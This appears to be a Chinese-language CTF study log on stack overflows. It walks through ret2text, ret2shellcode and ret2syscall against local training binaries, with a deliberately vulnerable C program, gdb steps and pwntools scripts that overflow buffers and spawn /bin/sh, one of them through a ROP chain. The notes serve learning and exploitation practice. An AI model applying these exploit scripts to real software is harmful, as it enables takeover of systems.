# PWN

计划是先跟着ctf-wiki走，期间也做做攻防世界的初始题。

## 栈溢出

​       栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：

- 程序必须向栈上写入数据。

- 写入的数据大小没有被良好地控制。

  利用关键点：**寻找危险函数**、**确认填充长度**

### 基本ROP

#### 栈溢出example

```C
#include <stdio.h>
#include <string.h>

void success(void)
{
    puts("You Hava already controlled it.");
}

void vulnerable(void)
{
    char s[12];

    gets(s);
    puts(s);

    return;
}

int main(int argc, char **argv)
{
    vulnerable();
    return 0;
}
```

可以看到虽然定义了success函数，但是并没有真正使用。

```
gcc -m32 -fno-stack-protector stack_example.c -o stack_example 
```

因为IDA的版权原因，下面用的是ghidra。

success函数位置，即后面要覆盖ret的位置

![image-20240521102551637](./pwn.assets/image-20240521102551637.png)

查看gets的参数到ebp的距离为0x14，填充字符长度为0x14 + 0x4

![image-20240521102347152](./pwn.assets/image-20240521102347152.png)

```python
##coding=utf8
from pwn import *
## 构造与程序交互的对象
sh = process('./stack_example')
success_addr = 0x080491b6
## 构造payload
payload = b'a' * 0x14 + b'bbbb' + p32(success_addr)
print(p32(success_addr))
## 向程序发送字符串
sh.sendline(payload)
## 将代码交互转换为手工交互
sh.interactive()
```

![image-20240521145036717](./pwn.assets/image-20240521145036717.png)



#### ret2text

ret2text 即控制程序执行程序本身已有的的代码 (即， `.text` 段中的代码) 。

main函数中的gets是危险函数

![image-20240521103733098](./pwn.assets/image-20240521103733098.png)

未调用的secure函数中存在system(/bin/sh)，ret覆盖地址为0x0804863a

![image-20240521103818772](./pwn.assets/image-20240521103818772.png)

gets的参数这个只有相对于esp的位置，通过gef调试确认此时的ebp地址

![image-20240521104111944](./pwn.assets/image-20240521104111944.png)

```
gdb ./ret2text
# 在gets函数处下断点
b *0x080486ae
r
```

![image-20240521104340983](./pwn.assets/image-20240521104340983.png)

填充长度=ebp - esp - 0x16 + 0x4 = 0x70

```python
##coding=utf8
from pwn import *
## 构造与程序交互的对象
sh = process('./ret2text')
success_addr = 0x804863a
## 构造payload
payload = b'a' * 0x6c + b'bbbb' + p32(success_addr)
print(p32(success_addr))
## 向程序发送字符串
sh.sendline(payload)
## 将代码交互转换为手工交互
sh.interactive()
```

![image-20240521145013095](./pwn.assets/image-20240521145013095.png)



#### ret2shellcode

ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。**通常情况下，shellcode 需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码**。

![image-20240521145001123](./pwn.assets/image-20240521145001123.png)

同样的危险函数gets，不过下面copy了100个字符到buf2，可以作为shellcode写入的位置。整个操作流程应该是将shellcode写入buf2处，再通过gets函数将ret地址覆盖到buf2，获取程序控制权。

![image-20240521105543367](./pwn.assets/image-20240521105543367.png)

查看bss段（不知道怎么根据变量查看所属段）发现buf属于bss段，bss段起止位置在0x804a040-0x804a0e3

![image-20240521110940122](./pwn.assets/image-20240521110940122.png)

通过gdb vmmap查看bss段的可执行情况，发现可读可写不可执行，应该就是ctfwiki中提到的内核版本原因。

![image-20240521111338170](./pwn.assets/image-20240521111338170.png)

gets处下断点计算填充长度。

![image-20240521112424042](./pwn.assets/image-20240521112424042.png)

在strncpy处下断点，说实话没看出来到底是哪个参数被用给了buf当地址，看了一圈只有0x804a080在bss段内，就它了。

![image-20240521113202735](./pwn.assets/image-20240521113202735.png)

```python
#!/usr/bin/env python
from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

# 计算可得填充字符数位112
sh.sendline(shellcode.ljust(112, b'A') + p32(buf2_addr))
sh.interactive()
```

无可执行权限，执行失败。



#### ret2syscall

ret2syscall，即控制程序执行系统调用，获取 shell。

`checksec rop`

![image-20240521144939951](./pwn.assets/image-20240521144939951.png)

```
NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。
```

![在这里插入图片描述](./pwn.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcxMTMxOA==,size_16,color_FFFFFF,t_70.png)

![image-20240521133247953](./pwn.assets/image-20240521133247953.png)

不存在后门函数，无法写shellcode，通过修改寄存器的值进行系统调用。通过ROPgadget工具寻找可用的片段。

```
pip install capstone
https://github.com/JonathanSalwan/ROPgadget
报错：pkg_resources.ResolutionError: Script 'scripts/ROPgadget' not found in metadata at '/usr/local/lib/python3.8/dist-packages/ROPGadget-7.4.dist-info'
解决：cp -r scripts/ /usr/local/lib/python3.8/dist-packages/ROPGadget-7.4.dist-info
```

![image-20240521144642261](./pwn.assets/image-20240521144642261.png)

先压地址再压参数。

![image-20240521145256497](./pwn.assets/image-20240521145256497.png)

![image-20240521145418148](./pwn.assets/image-20240521145418148.png)

![image-20240521145545614](./pwn.assets/image-20240521145545614.png)

![image-20240521150442186](./pwn.assets/image-20240521150442186.png)

```python
#!/usr/bin/env python
from pwn import *

sh = process('./rop')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(
    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
sh.sendline(payload)
sh.interactive()
```

